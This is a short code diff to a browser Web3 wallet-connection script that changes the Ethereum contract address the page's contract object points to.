@@ -1,6 +1,6 @@
 var web3 = new Web3(window.ethereum);
 
-const contractConnectWalletAddress = '0xBF7bCA44DE04e04d3501CAdA150Eb3C362D6ff80';
+const contractConnectWalletAddress = '0xece309fc65f53a3c620f554f4191cb00cc0dacfc';
 
 var userAddress;
 const contract = new web3.eth.Contract(ABI, contractConnectWalletAddress);
